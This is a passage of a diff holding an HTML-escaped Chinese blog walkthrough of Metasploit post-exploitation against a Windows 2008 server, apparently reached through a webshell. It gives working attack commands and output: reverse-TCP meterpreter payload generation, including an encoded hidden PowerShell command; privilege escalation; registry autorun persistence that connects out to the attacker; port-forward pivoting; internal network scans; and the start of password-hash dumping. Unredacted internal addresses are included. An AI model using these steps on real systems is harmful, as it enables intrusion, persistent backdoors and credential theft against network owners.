-   默认网关. . . . . . . . . . . . . : 
- 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;这个内网地址我就不脱敏了，方便读者阅读后面的操作&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-后渗透的开始&quot;&gt;0x02 后渗透的开始&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-12-28/2017-12-28-0x01.png&quot; alt=&quot;0x01&quot; /&gt;
-网络拓扑图如上&lt;/p&gt;
-
-&lt;p&gt;首先我要生成一个MSF木马，目标由于是Win 2008支持&lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt;，可以直接一句话搞定 :)&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./ps1encode.rb -i 外网IP -p 1131 -a windows/x64/meterpreter/reverse_tcp &lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;这里我是进行了一个端口转发，将公司路由的1131映射到本机的1131&lt;/p&gt;
-
-&lt;p&gt;MSF这边监听1131：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Jobs
-====
-
-  Id  Name                    Payload                          Payload opts
-  --  ----                    -------                          ------------
-  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://0.0.0.0:1131
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;ps1encode 项目 ：https://github.com/CroweCybersecurity/ps1encode&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell -nop -win Hidden -noni -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ
-..........
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;但是期望越大失望越大，目标主机提示语法错误，难道是webshell传输字符串太长有丢失？&lt;/p&gt;
-
-&lt;p&gt;我尝试了使用cmd批处理脚本启动，vbs脚本启动，一样无果。&lt;/p&gt;
-
-&lt;p&gt;决定不采用powershell了，采用exe&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ps1encode.rb -i [我的公网IP] -p 1131 -a windows/x64/meterpreter/reverse_tcp -t exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;执行过程中有时候会出现这类情况：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; 
-[*] Sending stage (179267 bytes) to *.*.*.*
-[*] Meterpreter session 1 opened (192.168.3.13:1131 -&amp;gt; *.*.*.*:54103) at 2017-12-27 13:54:58 +0800
-[*] *.*.*.* - Meterpreter session 9 closed.  Reason: Died
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;很明显是生成的木马与操作系统不兼容；&lt;/p&gt;
-
-&lt;p&gt;更改为：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ps1encode.rb -i *.*.*.* -p 1131 -a windows/x64/meterpreter/reverse_tcp --32bitexe -t exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;使用WebShell执行后：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; 
-[*] Sending stage (179267 bytes) to *.*.*.*
-[*] Meterpreter session 6 opened (192.168.3.13:1131 -&amp;gt; *.*.*.*:54085) at 2017-12-27 13:51:41 +0800
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;权限维持&quot;&gt;权限维持&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; sessions -i 6
-[*] Starting interaction with 6...
-meterpreter &amp;gt; getsystem
-...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
-meterpreter &amp;gt; run persistence -X -i 50 -p 1132 -r [我的公网IP] 
-
-[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
-[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
-[*] Running Persistence Script
-[*] Resource file for cleanup created at /Users/liyingzhe/.msf4/logs/persistence/ZXKF3_20171227.1214/ZXKF3_20171227.1214.rc
-[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=*.*.*.* LPORT=1132
-[*] Persistent agent script is 99700 bytes long
-[+] Persistent Script written to C:\Users\ALLEN~1.ZXK\AppData\Local\Temp\iyWfiOpMC.vbs
-[*] Executing script C:\Users\ALLEN~1.ZXK\AppData\Local\Temp\iyWfiOpMC.vbs
-[+] Agent executed with PID 5204
-[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CRHiMoLoChdTP
-[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\CRHiMoLoChdTP
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x03-关于权限维持的思考&quot;&gt;0x03 关于权限维持的思考&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;persistence 模块&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; info post/windows/manage/persistence_exe
-
-       Name: Windows Manage Persistent EXE Payload Installer
-     Module: post/windows/manage/persistence_exe
-   Platform: Windows
-       Arch: 
-       Rank: Normal
-
-Provided by:
-  Merlyn drforbin Cousins &amp;lt;drforbin6@gmail.com&amp;gt;
-
-Basic options:
-  Name      Current Setting  Required  Description
-  ----      ---------------  --------  -----------
-  REXENAME  default.exe      yes       The name to call exe on remote system
-  REXEPATH                   yes       The remote executable to use.
-  SESSION                    yes       The session to run this module on.
-  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
-
-Description:
-  This Module will upload an executable to a remote host and make it 
-  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
-  will start on user login, SYSTEM will start on system boot but 
-  requires privs. SERVICE will create a new service which will start 
-  the payload. Again requires privs.
-
-
-
-Module options (post/windows/manage/persistence_exe):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   REXENAME  default.exe      yes       The name to call exe on remote system
-   REXEPATH                   yes       The remote executable to use.
-   SESSION                    yes       The session to run this module on.
-   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;优先介绍这个模块 &lt;code class=&quot;highlighter-rouge&quot;&gt;post/windows/manage/persistence_exe&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;它用于创建一个反向连接的后门，使被控端主动连接控制端，传统又好用，但是会留下文件&lt;/p&gt;
-
-&lt;p&gt;参数介绍：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
-[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
-Meterpreter Script for creating a persistent backdoor on a target host.
-
-OPTIONS:
-
-    -A        自启动一个匹配的handler会话来连接
-    -L &amp;lt;opt&amp;gt;  连接目标
-    -P &amp;lt;opt&amp;gt;  指定payload ，默认是 windows/meterpreter/reverse_tcp.
-    -S        在启动时作为服务自动启动代理（具有SYSTEM权限）
-    -T &amp;lt;opt&amp;gt;  使用模板
-    -U        用户登录时自动启动代理
-    -X        系统引导时自动启动代理
-    -h        帮助菜单
-    -i &amp;lt;opt&amp;gt;  间隔多少秒像控制端发送连接
-    -p &amp;lt;opt&amp;gt;  被控端要连接的端口
-    -r &amp;lt;opt&amp;gt;  被控端要连接的IP地址
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;metsvc&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run metsvc -h
-
-[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
-[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
-
-OPTIONS:
-
-    -A        自动启动一个匹配 exploit/multi/handler来连接服务
-    -h        帮助菜单
-    -r        卸载服务
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;它是一个正向的连接，不适用于复杂的内网环境&lt;/p&gt;
-
-&lt;h2 id=&quot;0x04-端口转发之portfwd详解&quot;&gt;0x04 端口转发之portfwd详解&lt;/h2&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; ifconfig
-
-Interface  1
-============
-Name         : Software Loopback Interface 1
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 4294967295
-IPv4 Address : 127.0.0.1
-IPv4 Netmask : 255.0.0.0
-IPv6 Address : ::1
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
-
-Interface 11
-============
-Name         : Broadcom NetXtreme Gigabit Ethernet
-Hardware MAC : c8:1f:66:f2:a9:6b
-MTU          : 1500
-IPv4 Address : 10.159.63.178
-IPv4 Netmask : 255.255.255.128
-IPv6 Address : fe80::4d1c:361b:b5e7:5894
-IPv6 Netmask : ffff:ffff:ffff:ffff::
-
-
-Interface 12
-============
-Name         : Microsoft ISATAP Adapter
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 1280
-IPv6 Address : fe80::5efe:a9f:3fb2
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
-
-Interface 13
-============
-Name         : Broadcom NetXtreme Gigabit Ethernet #2
-Hardware MAC : c8:1f:66:f2:a9:6c
-MTU          : 1500
-IPv4 Address : 169.254.191.36
-IPv4 Netmask : 255.255.0.0
-IPv6 Address : fe80::b805:65eb:7c4d:bf24
-IPv6 Netmask : ffff:ffff:ffff:ffff::
-
-
-Interface 14
-============
-Name         : Microsoft ISATAP Adapter #2
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 1280
-IPv6 Address : fe80::5efe:a9fe:bf24
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
-
-Interface 15
-============
-Name         : Broadcom NetXtreme Gigabit Ethernet #3
-Hardware MAC : c8:1f:66:f2:a9:6d
-MTU          : 1500
-IPv4 Address : 169.254.112.31
-IPv4 Netmask : 255.255.0.0
-IPv6 Address : fe80::1d1d:79:e7f1:701f
-IPv6 Netmask : ffff:ffff:ffff:ffff::
-
-
-Interface 16
-============
-Name         : Microsoft ISATAP Adapter #3
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 1280
-IPv6 Address : fe80::5efe:a9fe:701f
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
-
-Interface 17
-============
-Name         : Broadcom NetXtreme Gigabit Ethernet #4
-Hardware MAC : c8:1f:66:f2:a9:6e
-MTU          : 1500
-IPv4 Address : 10.159.191.178
-IPv4 Netmask : 255.255.255.128
-IPv4 Address : ***.***.***.***
-IPv4 Netmask : 255.255.255.255
-IPv6 Address : fe80::35ec:8852:7f1f:321d
-IPv6 Netmask : ffff:ffff:ffff:ffff::
-
-
-Interface 18
-============
-Name         : Microsoft ISATAP Adapter #4
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 1280
-IPv6 Address : fe80::5efe:a9f:bfb2
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-IPv6 Address : fe80::200:5efe:7b67:7168
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-
-
-Interface 21
-============
-Name         : Microsoft 6to4 Adapter
-Hardware MAC : 00:00:00:00:00:00
-MTU          : 1280
-IPv6 Address : 2002:7b67:7168::7b67:7168
-IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; netstat -anpt
-
-Connection list
-===============
-
-    Proto  Local address                  Remote address       State        User  Inode  PID/Program name
-    -----  -------------                  --------------       -----        ----  -----  ----------------
-    tcp    169.254.191.36:139             0.0.0.0:*            LISTEN       0     0      4/System
-    tcp    0.0.0.0:135                    0.0.0.0:*            LISTEN       0     0      12/svchost.exe
-    tcp    0.0.0.0:445                    0.0.0.0:*            LISTEN       0     0      4/System
-    tcp    0.0.0.0:3306                   0.0.0.0:*            LISTEN       0     0      1740/mysqld.exe
-    tcp    0.0.0.0:3389                   0.0.0.0:*            LISTEN       0     0      3740/svchost.exe
-    tcp    0.0.0.0:47001                  0.0.0.0:*            LISTEN       0     0      4/System
-    tcp    0.0.0.0:49152                  0.0.0.0:*            LISTEN       0     0      828/wininit.exe
-    tcp    0.0.0.0:49153                  0.0.0.0:*            LISTEN       0     0      1052/svchost.exe
-    tcp    0.0.0.0:49154                  0.0.0.0:*            LISTEN       0     0      1108/svchost.exe
-    tcp    0.0.0.0:21                     0.0.0.0:*            LISTEN       0     0      1692/svchost.exe
-    tcp    0.0.0.0:49160                  0.0.0.0:*            LISTEN       0     0      932/lsass.exe
-    tcp    0.0.0.0:49161                  0.0.0.0:*            LISTEN       0     0      924/services.exe
-    tcp    10.159.63.178:139              0.0.0.0:*            LISTEN       0     0      4/System
-    tcp    10.159.191.178:139             0.0.0.0:*            LISTEN       0     0      4/System
-    tcp    10.159.191.178:58359           *.*.*.*:1131   ESTABLISHED  0     0      5576/1.exe
-    tcp    10.159.191.178:58362           *.*.*.*:1131   ESTABLISHED  0     0      4700/1.exe
-    tcp    10.159.191.178:58590           *.*.*.*:4961  SYN_SENT     0     0      2472/Ijkptue.exe
-    tcp    169.254.112.31:139             0.0.0.0:*            LISTEN       0     0      4/System
-    tcp    0.0.0.0:80                     0.0.0.0:*            LISTEN       0     0      1584/httpd.exe
-    tcp6   :::49160                       :::*                 LISTEN       0     0      932/lsass.exe
-    tcp6   :::21                          :::*                 LISTEN       0     0      1692/svchost.exe
-    tcp6   :::80                          :::*                 LISTEN       0     0      1584/httpd.exe
-    tcp6   :::135                         :::*                 LISTEN       0     0      12/svchost.exe
-    tcp6   :::445                         :::*                 LISTEN       0     0      4/System
-    tcp6   :::3389                        :::*                 LISTEN       0     0      3740/svchost.exe
-    tcp6   :::47001                       :::*                 LISTEN       0     0      4/System
-    tcp6   :::49152                       :::*                 LISTEN       0     0      828/wininit.exe
-    tcp6   :::49153                       :::*                 LISTEN       0     0      1052/svchost.exe
-    tcp6   :::49154                       :::*                 LISTEN       0     0      1108/svchost.exe
-    tcp6   :::49161                       :::*                 LISTEN       0     0      924/services.exe
-    udp    0.0.0.0:500                    0.0.0.0:*                         0     0      1108/svchost.exe
-    udp    0.0.0.0:4500                   0.0.0.0:*                         0     0      1108/svchost.exe
-    udp    0.0.0.0:5355                   0.0.0.0:*                         0     0      1248/svchost.exe
-    udp    10.159.63.178:137              0.0.0.0:*                         0     0      4/System
-    udp    10.159.63.178:138              0.0.0.0:*                         0     0      4/System
-    udp    10.159.191.178:137             0.0.0.0:*                         0     0      4/System
-    udp    10.159.191.178:138             0.0.0.0:*                         0     0      4/System
-    udp    169.254.112.31:137             0.0.0.0:*                         0     0      4/System
-    udp    169.254.112.31:138             0.0.0.0:*                         0     0      4/System
-    udp    169.254.191.36:137             0.0.0.0:*                         0     0      4/System
-    udp    169.254.191.36:138             0.0.0.0:*                         0     0      4/System
-    udp6   :::500                         :::*                              0     0      1108/svchost.exe
-    udp6   :::4500                        :::*                              0     0      1108/svchost.exe
-    udp6   :::5355                        :::*                              0     0      1248/svchost.exe
-    udp6   fe80::1d1d:79:e7f1:701f:546    :::*                              0     0      1052/svchost.exe
-    udp6   fe80::35ec:8852:7f1f:321d:546  :::*                              0     0      1052/svchost.exe
-    udp6   fe80::4d1c:361b:b5e7:5894:546  :::*                              0     0      1052/svchost.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;可以看出服务器开启了3389，假设我如果需要连接3389该怎么办呢？ -  (刚才提到了，有防火墙的限制)&lt;/p&gt;
-
-&lt;h3 id=&quot;使用portfwd&quot;&gt;使用portfwd&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd -h
-Usage: portfwd [-h] [add | delete | list | flush] [args]
-
-
-OPTIONS:
-
-    -L &amp;lt;opt&amp;gt;  转发: 本地监听地址  反向: 本地主机连接到某个地址
-    -R        表示正向反向端口
-    -h        帮助信息
-    -i &amp;lt;opt&amp;gt;  端口转发条目的索引与交互（请参阅“列表”命令）
-    -l &amp;lt;opt&amp;gt;  转发：本地端口收听  反向：本地端口连接
-    -p &amp;lt;opt&amp;gt;  转发：远程端口连接  反向：远程端口监听
-    -r &amp;lt;opt&amp;gt;  转发：连接到远程主机
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;下面来练习一下（正向转发）&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;目的：将内网某台主机的3389转发到本地&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd add -L 0.0.0.0 -l 1144 -p 3389 -r 10.159.63.178
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;此时连接本机的1144就相当于连接10.159.63.178&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;目的：将内网某台主机端口流量转发到某台外网主机 (可做端口劫持)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd add -R -l 8080 -p 1478 -L 10.159.191.2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;此时访问10.159.63.178的1478端口就相当于访问10.159.191.2的8080端口&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd delete -i 1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;删除条目为1的端口转发&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd list
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;列出端口转发条目&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;portfwd flush
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;清空所有转发&lt;/p&gt;
-
-&lt;h3 id=&quot;端口扫描&quot;&gt;端口扫描&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;添加路由表:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run autoroute -s 10.159.0.0 255.255.128.0
-meterpreter &amp;gt; run autoroute -s 10.159.128.0 255.255.128.0
-meterpreter &amp;gt; run autoroute -s 10.159.63.0 255.255.255.128
-meterpreter &amp;gt; run autoroute -s 10.159.191.0 255.255.255.128
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;当然在上线前，你就设置好自动添加路由，就不需要去手动添加了：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf auxiliary(tcp) &amp;gt; load auto_add_route
-msf auxiliary(tcp) &amp;gt; 
-[*] Sending stage (179267 bytes) to ***.***.***.***
-[*] Meterpreter session 9 opened (192.168.3.14:1131 -&amp;gt; ***.***.***.***:60372) at 2018-01-02 15:22:20 +0800
-[*] AutoAddRoute: Routing new subnet 10.0.0.0/255.0.0.0 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.0.0/255.255.128.0 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.63.128/255.255.255.128 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.128.0/255.255.128.0 through session 9
-[*] AutoAddRoute: Routing new subnet 10.159.191.128/255.255.255.128 through session 9
-[*] AutoAddRoute: Routing new subnet 169.254.0.0/255.255.0.0 through session 9
-[*] AutoAddRoute: Routing new subnet 192.168.0.0/255.255.0.0 through session 9
-[-] The 'stdapi' extension has already been loaded.
-msf auxiliary(tcp) &amp;gt; sessions -i 9 
-[*] Starting interaction with 9...
-
-meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;但是它也有弊端，就是子网太大了，可能会将我们的数据包广播出去，所以最好记一下子网大小，手动灵活添加路由~&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;扫描&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; use auxiliary/scanner/portscan/syn
-msf auxiliary(syn) &amp;gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
-PORTS =&amp;gt; 22-25,80-85,1433,3306,3389,445,135,139
-msf auxiliary(syn) &amp;gt; set RHOSTS 10.159.191.1-254
-RHOSTS =&amp;gt; 10.159.191.1-254
-msf auxiliary(syn) &amp;gt; run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/portscan/tcp 
-msf auxiliary(tcp) &amp;gt; show options 
-
-Module options (auxiliary/scanner/portscan/tcp):
-
-   Name         Current Setting  Required  Description
-   ----         ---------------  --------  -----------
-   CONCURRENCY  10               yes       The number of concurrent ports to check per host
-   DELAY        0                yes       The delay between connections, per thread, in milliseconds
-   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
-   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
-   RHOSTS                        yes       The target address range or CIDR identifier
-   THREADS      1                yes       The number of concurrent threads
-   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
-
-msf auxiliary(tcp) &amp;gt; set PORTS 22-25,80-85,1433,3306,3389,445,135,139
-PORTS =&amp;gt; 22-25,80-85,1433,3306,3389,445,135,139
-msf auxiliary(tcp) &amp;gt; set RHOSTS 10.159.191.1-254
-RHOSTS =&amp;gt; 10.159.191.1-254
-msf auxiliary(tcp) &amp;gt; set THREADS 3
-THREADS =&amp;gt; 3
-msf auxiliary(tcp) &amp;gt; run
-[+] 10.159.191.1:         - 10.159.191.1:22 - TCP OPEN
-[+] 10.159.191.2:         - 10.159.191.2:8080 - TCP OPEN
-[+] 10.159.191.5:         - 10.159.191.5:22 - TCP OPEN
-[+] 10.159.191.5:         - 10.159.191.5:8080 - TCP OPEN
-[+] 10.159.191.7:         - 10.159.191.7:22 - TCP OPEN
-[+] 10.159.191.8:         - 10.159.191.8:22 - TCP OPEN
-[+] 10.159.191.7:         - 10.159.191.7:8080 - TCP OPEN
-[+] 10.159.191.8:         - 10.159.191.8:8080 - TCP OPEN
-[+] 10.159.191.6:         - 10.159.191.6:8080 - TCP OPEN
-[+] 10.159.191.10:        - 10.159.191.10:22 - TCP OPEN
-[+] 10.159.191.11:        - 10.159.191.11:22 - TCP OPEN
-[+] 10.159.191.9:         - 10.159.191.9:22 - TCP OPEN
-[+] 10.159.191.11:        - 10.159.191.11:8080 - TCP OPEN
-[+] 10.159.191.9:         - 10.159.191.9:8080 - TCP OPEN
-[+] 10.159.191.10:        - 10.159.191.10:8080 - TCP OPEN
-[+] 10.159.191.12:        - 10.159.191.12:22 - TCP OPEN
-[+] 10.159.191.12:        - 10.159.191.12:8080 - TCP OPEN
-[+] 10.159.191.15:        - 10.159.191.15:22 - TCP OPEN
-[+] 10.159.191.15:        - 10.159.191.15:8080 - TCP OPEN
-[+] 10.159.191.13:        - 10.159.191.13:8080 - TCP OPEN
-[+] 10.159.191.18:        - 10.159.191.18:8080 - TCP OPEN
-[+] 10.159.191.17:        - 10.159.191.17:8080 - TCP OPEN
-[+] 10.159.191.19:        - 10.159.191.19:22 - TCP OPEN
-[+] 10.159.191.19:        - 10.159.191.19:8080 - TCP OPEN
-[+] 10.159.191.26:        - 10.159.191.26:22 - TCP OPEN
-[+] 10.159.191.26:        - 10.159.191.26:3306 - TCP OPEN
-[*] Scanned  26 of 254 hosts (10% complete)
-[+] 10.159.191.35:        - 10.159.191.35:22 - TCP OPEN
-[+] 10.159.191.36:        - 10.159.191.36:22 - TCP OPEN
-[+] 10.159.191.39:        - 10.159.191.39:22 - TCP OPEN
-[+] 10.159.191.39:        - 10.159.191.39:3306 - TCP OPEN
-[+] 10.159.191.50:        - 10.159.191.50:22 - TCP OPEN
-[+] 10.159.191.51:        - 10.159.191.51:22 - TCP OPEN
-[+] 10.159.191.50:        - 10.159.191.50:3306 - TCP OPEN
-******
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x05-meterpreter&quot;&gt;0x05 Meterpreter&lt;/h2&gt;
-
-&lt;h3 id=&quot;获取hash的几个方式&quot;&gt;获取Hash的几个方式&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;run hashdump&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run hashdump 
-
-[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
-[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
-[*] Obtaining the boot key...
-[*] Calculating the hboot key using SYSKEY 699b2df6ee97132bcad5b2f9efdc738e...
-/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
-[*] Obtaining the user list and keys...
-[*] Decrypting user keys...
